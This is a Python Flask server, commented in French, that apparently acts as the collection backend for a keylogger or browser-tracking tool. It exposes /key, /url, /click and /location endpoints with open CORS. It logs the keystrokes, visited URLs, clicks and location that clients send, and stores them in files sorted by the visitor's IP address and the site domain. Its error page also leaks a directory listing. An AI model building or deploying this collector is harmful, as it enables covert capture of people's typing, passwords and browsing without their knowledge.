from flask import Flask, request, render_template
from flask_cors import CORS
import os
import json

app = Flask(__name__)
CORS(app)
port = 9000

# Middleware pour gérer les en-têtes CORS
@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Headers'] = 'Origin, X-Requested-With, Content-Type, Accept'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Private-Network'] = 'true'
    return response


# Route pour envoyer une réponse simple pour la route GET
@app.route('/', methods=['GET'])
def hello_world():
    try:
        return render_template("index.html")
    except Exception as e:
        print(f"Error rendering template: {e}")
        # Liste les fichiers dans le répertoire actuel
        files = os.listdir('.')
        error_message = f"Internal Server Error: {e}\n\nDirectory Listing:\n{files}"
        return error_message, 500

# Route pour recevoir les données du client - URL
@app.route('/url', methods=['POST'])
def receive_url():
    if request.headers.get('X-Forwarded-For'):
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        visitor_ip = request.remote_addr

    received_data = request.json
    print('URL:', received_data)
    dossier(visitor_ip, received_data)
    return 'Données reçues'

# Route pour recevoir les données du client - Key
@app.route('/key', methods=['POST'])
def receive_key():
    if request.headers.get('X-Forwarded-For'):
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        visitor_ip = request.remote_addr

    received_data = request.json
    print(f'Données reçues touche {visitor_ip}: {received_data}')
    dossier(visitor_ip, received_data)
    return 'Données reçues'

# Route pour recevoir les données du client - Click
@app.route('/click', methods=['POST'])
def receive_click():
    if request.headers.get('X-Forwarded-For'):
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        visitor_ip = request.remote_addr
    print('clicked', visitor_ip)

    received_data = request.json
    print(f'Données reçues click {visitor_ip}: {received_data}')
    dossier(visitor_ip, received_data)
    return 'Données reçues'

# Route pour recevoir les données de localisation
@app.route('/location', methods=['POST'])
def receive_location():
    if request.headers.get('X-Forwarded-For'):
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        visitor_ip = request.remote_addr

    received_data = request.json
    print(f'Données de localisation reçues de {visitor_ip}: {received_data}')
    return 'Données de localisation reçues par le serveur'

def nettoyer_nom_repertoire(nom):
    # Remplacer les caractères invalides par des underscores
    return nom.replace(':', '_').replace('/', '_').replace('\\', '_')

def dossier(ip, data):
    try:
        print('________________________________________________________')
        print('IP:', ip, "Données:", data)
        
        # Création du répertoire IP si nécessaire
        data_ip_dir = f"Data/{ip}"
        if not os.path.exists(data_ip_dir):
            os.makedirs(data_ip_dir)
            print('Dossier créé:', data_ip_dir)
        else:
            print('Dossier déjà existant:', data_ip_dir)

        # Extraction du domaine de l'URL et création des répertoires nécessaires
        url = data.get('url', 'unknown_url')
        domaine = url.split('//')[1].split('/')[0] if '//' in url else 'unknown_domain'
        domaine_nettoye = nettoyer_nom_repertoire(domaine)
        data_url_dir = f"Data/{ip}/{domaine_nettoye}"
        
        if not os.path.exists(data_url_dir):
            os.makedirs(data_url_dir)
            print('Dossier créé:', data_url_dir)
        else:
            print('Dossier déjà existant:', data_url_dir)

        # Écriture des données dans le fichier de log
        log_file = os.path.join(data_url_dir, 'log.txt')
        with open(log_file, 'a', encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)    
            f.write('\n')
            print('Données écrites dans le fichier:', log_file)
        
        print('________________________________________________________')
    except Exception as e:
        print(f"Erreur dans la fonction dossier: {e}")

# Démarrer le serveur Flask avec SSL/TLS
if __name__ == '__main__':
    cert_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'apache-certificate.crt')
    key_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'apache.key')
    app.run(host='0.0.0.0', port=port, ssl_context=(cert_path, key_path))